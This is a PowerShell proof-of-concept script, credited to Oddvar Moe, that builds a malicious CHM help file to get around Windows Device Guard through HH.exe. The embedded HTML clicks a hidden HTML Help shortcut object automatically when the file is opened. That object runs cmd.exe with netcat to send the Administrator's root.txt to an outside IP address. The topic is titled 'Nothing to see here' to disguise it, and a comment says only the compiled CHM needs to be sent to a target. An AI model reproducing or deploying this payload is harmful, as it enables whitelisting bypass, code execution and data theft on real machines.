# POC HH.exe - Device Guard bypass
# Oddvar Moe - https://msitpros.com
# Code execution with HH.exe / CHM files
# Code to generate CHM was borrowed from:
# https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1

$Outputpath = "D:\Escritorio\test"
   
#Create the table of contents for the CHM
$CHMTableOfContents = @"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<HTML>
<HEAD>
<meta name="GENERATOR" content="Microsoft&reg; HTML Help Workshop 4.1">
<!-- Sitemap 1.0 -->
</HEAD><BODY>
  <UL>
  <LI> <OBJECT type="text/sitemap">
      <param name="Name" value="Oddvar deserves the nobel price - Or at least a CVE :-)">
      <param name="Local" value="doc.htm">
  </OBJECT>
  </UL>
</BODY>
</HTML>
"@

#Create the Project file for the CHM
$CHMProject = @"
[OPTIONS]
Contents file=$OutputPath\doc.hhc
[FILES]
$OutputPath\doc.htm
$OutputPath\doc1.htm
"@
    
#Create the HTM files, the first one controls the payload execution.
$CHMHTML1 = @"
    <HTML>
    <TITLE>Nothing to see here</TITLE>
    <HEAD>
    </HEAD>
    <BODY>



<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
<PARAM name="Button" value="Bitmap::shortcut">
<!-- Can do like the next line to execute commands directly. Will probably be blocked by Device Guard -->
<PARAM name="Item1" value=",cmd.exe,/c C:\Docs\nc.exe 10.10.15.19 7777 < C:\Users\Administrator\Desktop\root.txt;">
<PARAM name="Item2" value="273,1,1">
</OBJECT>


<SCRIPT>
x.Click();
</SCRIPT>


</content></div></div><hr /><p /></div></body></html>
</BODY>
</HTML>
"@

    #Second help topic to make the file look authentic.
    $CHMHTML2 = @"
<html> </html>

"@

    #Write all files to disk for compilation
    Out-File -InputObject $CHMTableOfContents -FilePath "$OutputPath\doc.hhc" -Encoding default
    Out-File -InputObject $CHMHTML1 -FilePath "$OutputPath\doc.htm" -Encoding default
    Out-File -InputObject $CHMHTML2 -FilePath "$OutputPath\doc1.htm" -Encoding default
    Out-File -InputObject $CHMProject -FilePath "$OutputPath\doc.hhp" -Encoding default
    
    #Compile the CHM, only this needs to be sent to a target.
    $HHCPath = "C:\Program Files (x86)\HTML Help Workshop"
    $HHC = "$HHCPath" + "\hhc.exe"
    & "$HHC" "$OutputPath\doc.hhp"

    #Cleanup
    Remove-Item "$OutputPath\doc.hhc"
    Remove-Item "$OutputPath\doc.htm"
    Remove-Item "$OutputPath\doc1.htm"
    Remove-Item "$OutputPath\doc.hhp"
   